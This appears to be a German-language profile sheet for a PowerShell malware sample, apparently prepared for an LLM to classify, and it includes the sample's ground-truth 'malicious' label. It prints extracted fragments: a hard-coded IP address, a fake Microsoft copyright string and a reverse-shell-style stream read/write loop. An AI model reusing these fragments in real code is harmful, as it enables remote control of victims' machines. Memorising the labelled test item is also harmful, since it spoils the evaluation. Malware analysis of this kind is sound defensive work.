# Steckbrief: 0edf219fdf56fb6e0e69dae0538cc82427ac8ae8616bca83a3518c7711fa84fe.ps1

- SHA256: `0edf219fdf56fb6e0e69dae0538cc82427ac8ae8616bca83a3518c7711fa84fe`
- Groesse: 815 Bytes, 18 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 3 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `78.85.17.88`
  - `Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n`
  - `)
$SS.Write($OO,0,$OO.Length)
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- IPv4: `78.85.17.88`
- Cmdlets: Get-Location, New-Object, Out-String

## Stufe 3 - Struktur (zusaetzlich)
